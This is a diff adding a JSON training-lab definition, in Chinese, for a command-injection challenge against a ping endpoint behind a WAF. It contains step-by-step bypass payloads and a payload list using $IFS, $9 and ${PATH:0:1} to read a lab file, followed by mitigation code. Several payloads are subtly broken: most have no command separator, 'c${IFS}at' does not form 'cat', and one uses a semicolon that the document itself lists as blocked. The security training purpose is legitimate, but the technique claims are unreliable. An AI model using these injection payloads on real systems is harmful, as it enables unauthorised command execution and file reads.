@@ -1,0 +1,98 @@
+{
+  "context": "rce_ping_a3",
+  "title": "命令注入 · A3（拦截 ; && | ` $( ) 换行）",
+  "goal": "绕过 WAF 拦截，使用变量替代（IFS、变量拼接）执行第二条命令",
+  "vuln": {
+    "summary": "VULN：WAF 拦截大部分分隔符，但未拦截变量和函数构造",
+    "impact": [
+      "任意命令执行：攻击者可以通过变量替代绕过 WAF",
+      "高级绕过：使用 Bash 变量和函数构造命令"
+    ],
+    "waf": {
+      "blocked_chars": [";", "&", "|", "`", "$(", ")", "\r", "\n"],
+      "description": "WAF 拦截分号、逻辑与、管道符、反引号、$()、换行符"
+    }
+  },
+  "exploit": {
+    "steps": [
+      {
+        "step": 1,
+        "title": "测试 WAF 拦截",
+        "description": "尝试使用被拦截的分隔符，确认 WAF 生效",
+        "payload": "127.0.0.1; cat /opt/lab/hosts",
+        "expected": "WAF 拦截提示"
+      },
+      {
+        "step": 2,
+        "title": "使用 IFS 替代空格",
+        "description": "使用 $IFS 变量替代空格，绕过空格过滤",
+        "payload": "127.0.0.1${IFS}cat${IFS}/opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      },
+      {
+        "step": 3,
+        "title": "使用 $IFS$9 替代空格",
+        "description": "使用 $IFS$9 变量替代空格，更隐蔽",
+        "payload": "127.0.0.1$IFS$9c$IFS$9at$IFS$9/opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      },
+      {
+        "step": 4,
+        "title": "使用变量拼接构造命令",
+        "description": "使用变量拼接构造 cat 命令",
+        "payload": "127.0.0.1c${IFS}at${IFS}/opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      }
+    ],
+    "payloads": {
+      "ifs": [
+        "127.0.0.1${IFS}cat${IFS}/opt/lab/hosts",
+        "127.0.0.1$IFS$9c$IFS$9at$IFS$9/opt/lab/hosts",
+        "127.0.0.1${IFS}$9c${IFS}$9at${IFS}$9/opt/lab/hosts"
+      ],
+      "variable_concat": [
+        "127.0.0.1c${IFS}at${IFS}/opt/lab/hosts",
+        "127.0.0.1${IFS}c${IFS}a${IFS}t${IFS}/opt/lab/hosts"
+      ],
+      "path_slice": [
+        "127.0.0.1;cat${IFS}${PATH:0:1}opt${PATH:0:1}lab${PATH:0:1}hosts"
+      ]
+    }
+  },
+  "mitigation": {
+    "title": "修复建议",
+    "approaches": [
+      {
+        "name": "白名单验证",
+        "description": "只允许 IP 地址格式，拒绝其他所有输入",
+        "code": {
+          "language": "java",
+          "snippet": "if (!host.matches(\"^[0-9.]+$\")) {\n    throw new IllegalArgumentException(\"Invalid host\");\n}"
+        }
+      },
+      {
+        "name": "参数化执行",
+        "description": "使用 ProcessBuilder 参数数组，避免 shell 解析",
+        "code": {
+          "language": "java",
+          "snippet": "ProcessBuilder pb = new ProcessBuilder(\"ping\", \"-c\", \"1\", host);\nProcess process = pb.start();"
+        }
+      },
+      {
+        "name": "最小权限",
+        "description": "应用程序以非 root 用户运行，限制命令执行权限"
+      }
+    ]
+  },
+  "tips": [
+    "$IFS 是 Bash 内部字段分隔符，默认为空格、制表符、换行",
+    "$IFS$9 使用 $9 作为后缀，避免某些解析问题",
+    "变量拼接可以绕过关键字过滤（cat -> c${IFS}at）",
+    "WAF 黑名单很难完全覆盖所有绕过方式，白名单更安全"
+  ],
+  "common_mistakes": [
+    "使用了被拦截的分隔符（; && | ` $( ) 换行）",
+    "忘记在命令之间添加 IFS 替代空格",
+    "混淆了 $IFS 和 $IFS$9 的使用"
+  ]
+}
